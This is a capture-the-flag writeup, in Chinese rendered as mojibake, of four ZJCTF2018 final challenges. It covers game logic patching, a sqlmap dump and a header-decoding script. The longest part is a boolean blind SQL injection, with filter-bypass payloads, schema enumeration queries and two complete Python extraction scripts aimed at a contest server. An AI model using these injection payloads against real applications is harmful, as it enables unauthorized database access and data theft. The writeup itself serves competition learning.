# ZJCTF2018 final
#CTF/Writeup
è®°å½•ä¸€ä¸‹çœèµ›çº¿ä¸‹è¿™ä¸€å¤©æˆ‘å‚ä¸Žçš„é¢˜ç›®ï¼Œä»¥ä½œç•™å­˜ã€‚

## 0x01ä½ è¿½æˆ‘èµ¶
çœ‹åˆ°è¿™é“é¢˜ï¼Œå…ˆæŠ“åŒ…ï¼Œå‘çŽ°åŒ…å†…æœ‰é™æ€ js æ–‡ä»¶ï¼š`/static/game/index.js`

è€Œä¸”æºç é‡Œä¹Ÿæç¤ºé¢˜ç›®æ˜¯ offlineï¼Œå¯ä»¥æƒ³è§è¿™é“é¢˜ç›®çš„æ€»ä½“æ€è·¯æ˜¯ä¿®æ”¹æœ¬åœ°é€» è¾‘ã€‚ è¿™æ˜¯ä¸€ä¸ªä»¥ chrome æé¾™æ¸¸æˆä¸ºåŸºç¡€çš„é¢˜ç›®ï¼Œåœ¨ä»¥å‰ä¹Ÿåšåˆ°è¿‡ï¼Œä¸åŒçš„æ˜¯ï¼Œåœ¨ home é¡µé¢å¯ä»¥çœ‹åˆ°æ¸¸æˆè§„åˆ™é‡Œå†™åšæŒ 1 åˆ†é’Ÿå³å¯èŽ·å¾— flagã€‚å› æ­¤æ”¹åˆ†æ•°æ˜¯ä¸å¤ªå¯¹çš„ï¼Œ æ‰€ä»¥æˆ‘é€‰æ‹©æœç´¢ç¢°æ’žé€»è¾‘ç„¶åŽä¿®æ”¹,åŽ»æŽ‰äº† else åŽé¢è°ƒç”¨ gameover çš„ä»£ç ï¼Œè¿™æ · å°±ä¸ä¼šç¢°æ’žäº†ï¼š
![](ZJCTF2018%20final/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-11-05%20%E4%B8%8A%E5%8D%888.56.05.png)
äº”åˆ†é’ŸåŽè¿˜åŽŸä»£ç ï¼Œç„¶åŽç”¨ burp æ‹¦æˆª ajax è¯·æ±‚ï¼Œåœ¨å›žå¤æŠ¥æ–‡ä¸­èŽ·å¾— flagã€‚ å½“ç„¶ï¼Œåœ¨å†™ wp å¤çœ‹è¿™æ®µä»£ç çš„æ—¶å€™è¿˜æ‰¾åˆ°äº† post è¯·æ±‚çš„ä»£ç æ®µï¼Œè¿™æ ·è‡ªä¸»å‘åŒ… æƒ³å¿…åº”è¯¥ä¹Ÿæ˜¯ä¸€ç§æ€è·¯ã€‚
å†³èµ›åŽæ–°åŠ postæˆåŠŸåŽçš„å››å¼ å›¾ç‰‡åƒç´ ä½æ¯”è¾ƒï¼Œå› ä¸ºmiscæˆ‘ä¸ç®¡ï¼Œåœ¨æ­¤å°±ä¸å¤šèµ˜è¿°ã€‚

##  0x02çŸ¥æ³•æ‡‚æ³•
Sqlmapæ‰«idå­—æ®µdumpå‡ºæ•´ä¸ªæ•°æ®åº“ï¼Œæ¯”å¯¹æ¯ä¸€æ¡å’Œç½‘ç»œå®‰å…¨æ³•æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚å‘çŽ°ç¬¬äºŒåä¹æ¡ä¸Žæ ‡å‡†æ³•ä¸åŒã€‚
ç„¶åŽçŒœè°œï¼Œè¯¥æäº¤ä»€ä¹ˆå‘¢ï¼Œå¾€å“ªé‡Œæäº¤å‘¢ï¼ŸctfçœŸæ˜¯ä¸€ä¸ªçŒœè°œæ¸¸æˆï¼Œçˆ†äº†ç½‘é¡µï¼Œçˆ†äº†å±žæ€§åï¼Œæœ€åŽå‘çŽ°æäº¤æ­£ç¡®çš„ç¬¬äºŒåä¹æ¡å†…å®¹å³å¯èŽ·å¾—flag


## 0x03å†å¿«ä¸€ç‚¹
åŽŸé¢˜ï¼Œå­˜åœ¨äºŽå„ç±»åŸºç¡€ctfé¢˜åº“ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š
```
import requests
import base64

url= â€˜http://172.21.1.102:61234/hC1DU4oEZ3â€™
s = requests.Session()
flag = base64.b64decode(base64.b64decode(s.get(url).headers[â€˜flagâ€™]).decode(â€˜utf-8â€™).split(â€˜:â€™)[1]) 
postdata = {â€˜marginâ€™:flag}
*print*(s.post(url, data=postdata).text)
```


## 0x04Blind
å†™è¿™ç¯‡writeupå°±æƒ³è®°å½•ä¸€ä¸‹è¿™ä¸ªè€»è¾±ï¼Œè‡ªå·±æ‹±æ‰‹ç›¸è®©çš„å† å†›çœŸçš„å¾ˆä»¤äººéš¾å—ã€‚
### åŸºç¡€æ€§åˆ¤æ–­åˆ¤æ–­ï¼š
å½“è¢«å­—ç¬¦ç­‰æˆªæ–­å‰çš„æ•°å­—ä¸º1-5æ—¶è¿”å›žyou find it!ï¼Œè¢«è¿‡æ»¤å­—ç¬¦è¿”å›žProbably you need an other mothod.ï¼Œå…¶ä½™è¿”å›žhide more deepã€‚
å‘çŽ°é»‘åå•å­—ç¬¦ä¸ºï¼š`> <> != ' %27 # and union ç©ºæ ¼`
æœªè¢«è¿‡æ»¤çš„å­—ç¬¦ä¸ºï¼š`() ^ or %20 - CHAR() "  %00 select <`
ç¡®å®šæ˜¯å­—ç¬¦åž‹æ³¨å…¥ï¼š`1-1`ç»“æžœæœªå˜
æ‰€ä»¥æš‚ä¸”æŠŠhide more deepå½“ä½œ**é”™è¯¯å€¼**ï¼Œyou find it!å½“ä½œ**æ­£ç¡®å€¼**ï¼Œå› ä¸ºéœ€è¦ç”¨`or`è¿žæŽ¥ï¼Œæ‰€ä»¥ç¬¬ä¸€ä½è¦å…ˆå–é”™è¯¯å€¼ï¼Œæ¯”å¦‚`0`ï¼Œç„¶åŽoråŽæ‹Ÿæž„é€ å‡ºä¸€ä¸ªtrueï¼Œè®©æŸ¥è¯¢è¿”å›žæ­£ç¡®ï¼Œå¦åˆ™è¿”å›žé”™è¯¯ã€‚è¿‡ç¨‹ä¸­å‘çŽ°ï¼Œè™½ç„¶`'`è¢«è¿‡æ»¤ï¼Œä½†æ˜¯`â€`å´å¯ä»¥å®Œæˆæž„é€ ï¼Œè¯´æ˜Žå­—ç¬¦ä¸²è¢«åŒå¼•å·é—­åˆï¼Œæ‰€ä»¥å®Œæˆpocä¹Ÿä¸æˆé—®é¢˜ã€‚

### æœ€åŽæž„ç­‘payloadç»“æž„å¦‚ä¸‹ï¼š
 `0"or"1"^"1"^(xxxxxx)--%20` 
ps1: æˆ‘ðŸŽä¹Ÿä¸çŸ¥é“ç‹—å“¥åœ¨å¸®è¯•payloadçš„æ—¶å€™ç»åŽ†äº†ä»€ä¹ˆï¼Œæ ¸å¿ƒpayloadçš„å‰é¢è¦åŠ â€1â€^â€1â€ï¼Œè®²é“ç†è¿™æ ·èƒ½ç”¨çš„è¯ï¼Œåªè¦åœ¨æ ¸å¿ƒå‰åŠ â€œ0â€å³å¯ï¼Œä¸è¿‡ä»¤äººå¥‡æ€ªçš„æ˜¯ï¼šorâ€1â€^â€1â€å’Œor1^1è¿”å›žçš„ç»“æžœæœ‰å·®å¼‚ï¼Œå¯èƒ½æ•°æ®åº“æ˜¯MSSQLä¹‹ç±»çš„åŽŸå› ã€‚
ps2ï¼šç”±äºŽå½“æ—¶æˆ‘åœ¨å°è¯•äº†> å’Œ<>æ²¡æœ‰è¯•<ï¼Œç†æ‰€å½“ç„¶è§‰å¾—<ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ˜¯æˆ‘çš„å¤±è¯¯ï¼Œæ‰€ä»¥æœ€åŽç”¨å‡å·ï¼Œè¿™å¤§å¤§é™ä½Žäº†è„šæœ¬çš„ä¼˜åŠ¿ï¼Œä»¥è‡³äºŽæˆ‘åŽæ¥ä¸€ç›´é€‰æ‹©burpå·¥ç¨‹é”¤æ¥çˆ†ç ´ã€‚
ä¸ç®¡æ€Žä¹ˆè¯´ï¼Œæ€»ç®—æ˜¯èƒ½ç”¨äº†ã€‚

### ç¼–å†™è„šæœ¬ï¼š
è„šæœ¬é‡Œç”¨åˆ°çš„payloadå¦‚ä¸‹ï¼š
 `0"or"1"^"1"^(ascii(substr(database(),{0},1))-{1})--%20` 
è„šæœ¬ç¼–è¾‘å¦‚ä¸‹ï¼š
```
# POST boolean blind sql injection
import requests

url = 'http://172.21.1.102:61234/iFmn2H0UOq'
s = requests.Session()
key = ''

for pos in range(1,2): 
	for mid in range(0,127):
		payload = r'0"or"1"^"1"^(ascii(substr(database(),{0},1))-{1})--%20'.format(pos,mid)
		data = {'id':payload,'Submit':'Search'} 
		r = s.post(url, data=data)
		print(len(r.text))
		# if b"Hide more deep" in r.content:
		if len(r.text)==647:
			break

	key += chr(mid)
	print(key)
print("result:",key)
```
å¾ˆé—æ†¾ï¼Œä¸çŸ¥é“ä¸ºä½•ï¼ŒåŒæ ·çš„payloadï¼Œåœ¨burpä¸‹èƒ½çˆ†å‡ºæ¥ï¼Œè„šæœ¬å°±ä¼šå‡ºçŽ°é—®é¢˜ï¼ŒåŽŸå› å¤§æŠµæ˜¯pythonå¯¹payloadä¸­åŒå¼•å·çš„å¤„ç†å¯èƒ½å’Œæ­£å¸¸æŠ¥æ–‡æœ‰æ‰€ä¸åŒï¼Œæˆ‘ä¹Ÿä¸æ˜¯ç‰¹åˆ«ç†Ÿæ‚‰requestæ¨¡å—ï¼Œæ‰€ä»¥åœ¨æ­¤å³ç„¶burpèƒ½ç”¨ï¼Œå°±ç´¢æ€§ç”¨äº†burpã€‚

### burpä¸Šçˆ†è‚ä¸€èˆ¬çš„çˆ†ç ´å¼€å§‹ï¼š
ä½¿ç”¨payloadå¦‚ä¸‹ï¼š
`0"or"1"^"1"^(ascii(substr(((select group_concat(xxx) from xxx)),{0},1))-{1})--%20`
* çˆ†æ•°æ®åº“åï¼š
`0"or"1"^"1"^(ascii(substr((((select group_concat(schema_name) from information_schema.schemata))),{0},1))-{1})--%20`
èŽ·å¾—`information_schema tips useless`
* çˆ†è¡¨åï¼š
`0"or"1"^"1"^(ascii(substr(((SELECT group_concat(table_name) FROM information_schema.tables)),{0},1))-{1})--%20`
800å­—é•¿ã€‚ã€‚ã€‚ã€‚ã€‚
* çˆ†å­—æ®µåï¼š
`0"or"1"^"1"^(ascii(substr(((select group_concat(xxx) from xxx)),{0},1))-{1})--%20`
1200å­—é•¿ã€‚ã€‚ã€‚ã€‚ã€‚æ²¡æœ‰å†™è„šæœ¬çœŸçš„å¾ˆåƒµã€‚æ‰€ä»¥å°±åœ¨è¿™é‡Œå¡ä½äº†ã€‚ã€‚ã€‚
ä¸­é—´è¿˜ç”¨äº†maxå’Œmin,çˆ†å‡ºäº†zjctfè¿™ä¸ªè¡¨åï¼Œåˆ¤æ–­æ˜¯useless.zjctfï¼Œç„¶è€Œä¾æ—§æ— æµŽäºŽäº‹ï¼Œæœ€ç»ˆæ²¡æ‰¾åˆ°æ­£ç¡®çš„åˆ—åæ¯”èµ›å°±ç»“æŸäº†ã€‚
çŽ°åœ¨æƒ³æƒ³ï¼Œåº”è¯¥æ˜¯åŽ»è§£å†³æˆ‘è„šæœ¬ä¸Šçš„é—®é¢˜ï¼Œè€Œä¸æ˜¯å¤´é“æ¥ç”¨burpçˆ†ã€‚

### æ‹œè¯»ch1pæˆ˜é˜ŸwpåŽçš„æ€»ç»“å’Œæ€è€ƒ
å‡ ä¸ªç‚¹ï¼š
1. é¦–å…ˆï¼Œä»–ä»¬å’Œæˆ‘ä¸€æ ·ï¼Œburpä¸Šæ­£ç¡®çš„payloadç”¨åœ¨è„šæœ¬ä¸­å°±ä¼šå‡ºçŽ°é—®é¢˜ï¼Œä»–ä»¬çš„ç»“è®ºæ˜¯`--`ä¸Šä¼šæœ‰é—®é¢˜ï¼Œè¿™æˆ‘å°±æ²¡æœ‰æ·±ç©¶å‡ºæ¥ã€‚è€Œä¸”ï¼Œä»–ä»¬åŠæ—¶è½¬æ¢ç­–ç•¥ï¼Œå°†`--`æ¢æˆäº†`or "-`ï¼Œä½¿è„šæœ¬èƒ½å¤ŸæˆåŠŸè¿è¡Œã€‚å“Ž
2. åœ¨pocçš„è®¾è®¡ä¸Šï¼Œä½¿ç”¨`/**/`ä»£æ›¿ç©ºæ ¼ï¼Œæˆ‘ç”¨`^()`å–ä»£äº†ç©ºæ ¼ï¼›`in`å–ä»£æ¯”è¾ƒå­—ç¬¦ï¼Œæ‰€ä»¥ç”¨äº†substrå´æ²¡åŠ asciiã€‚æ²¡æœ‰ä½¿ç”¨`<`æˆ‘è§‰å¾—åœ¨è¿™å¥è¯æ¥è®²æ˜¯æœ‰é—®é¢˜çš„ï¼Œé¦–å…ˆæ˜¯ç¼–å†™è„šæœ¬çš„æ—¶å€™å°±ä¸èƒ½ç”¨äºŒåˆ†æ³•åŠ å¿«æœç´¢é€Ÿåº¦ï¼Œå…¶æ¬¡æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ç‰¹æ€§å¯¼è‡´äº†åŽé¢çˆ†writeupå‡ºçŽ°é—®é¢˜ã€‚

**å…¶éƒ¨åˆ†wpå¦‚ä¸‹ï¼š**
åœ¨å½“å‰åº“tipsä¸­ï¼Œå¹¶æ²¡æœ‰å‘çŽ°flag ,éœ€è¦è¿›è¡Œè·¨åº“æŸ¥è¯¢ï¼Œé¦–å…ˆéœ€è¦å…ˆåœ¨information_schemaåº“ä¸­ï¼ŒèŽ·å¾—æ‰€æœ‰çš„åº“åã€‚
payload:`payload = '-1" or substr((select group_concat(table_schema) from information_schema.tables where table_schema not in ("information_schema","tips")),%s,1) in ("%s") or "0'`
å¾—åˆ°è¿˜å­˜åœ¨ä¸€ä¸ªåä¸ºuserless çš„æ•°æ®åº“ï¼ŒæŸ¥è¯¢å…¶è¡¨æ®µï¼Œå¾—çŸ¥å­˜åœ¨zjctf è¡¨ï¼Œflag åœ¨å…¶content å­—æ®µã€‚
è·‘å‡ºçš„ flag ä¸ºï¼šzjctf{aa0_bl1nd_hha} ä½†æ˜¯ä¸Šäº¤æ—¶æç¤ºé”™è¯¯ã€‚æ‡µäº†ä¸€ä¼šå„¿åŽçªç„¶æƒ³èµ·in æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ é‚£ä¹ˆçŒœæµ‹å¤§å†™å­—æ¯ï¼Œé’ˆå¯¹ flag ä¸­å”¯ä¸€çš„å•è¯ï¼Œå°è¯•æäº¤aa0_Bl1nd_hha æˆåŠŸï¼

ä¸‹é¢æ˜¯å®Œæ•´çš„è„šæœ¬ï¼š
```
"""
    Author:Li4n0
    Date:2018-11-4
"""
import requests
import string

# in ä¸åŒºåˆ†å¤§å°å†™ éœ€è¦è‡ªå·±å†åˆ¤æ–­ä¸€æ¬¡

url = 'http://172.21.1.102:61234/iFmn2H0UOq'
#payload = '-1" or substr((select group_concat(column_name) from information_schema.columns where table_name in ("zjctf")),%s,1) in ("%s") or "0'

#payload = '-1" or substr((select group_concat(table_schema) from information_schema.tables where table_schema not in ("information_schema","tips")),%s,1) in ("%s") or "0'

payload = '-1" or substr((select group_concat(content) from useless.zjctf),%s,1) in ("%s") or "0'
key = ''
length = 1
while True:
    for i in string.printable.replace('#', ''):
        data = {
            'id': payload.replace(' ', '/**/') % (str(length), i),
            'Submit': 'Search'
        }
        r = requests.post(url, data=data)
        if 'You find' in r.text:
            key += i
            length += 1
            break
    print(key)
```
ä¸ªäººè®¤ä¸ºï¼Œè¿™ä¸ªè„šæœ¬ï¼Œç²¾é«“å°±åœ¨whereåŽçš„`in`å’Œ`not in`ï¼Œè´¥ç¬”åœ¨(â€œ%sâ€)å‰çš„`in`ã€‚ä¸ç®¡å¦‚ä½•ï¼Œå®ƒèƒ½è·‘å‡ºç­”æ¡ˆï¼Œä¸€åˆ‡éƒ½æ— æ‰€è°“äº†ã€‚


END:)


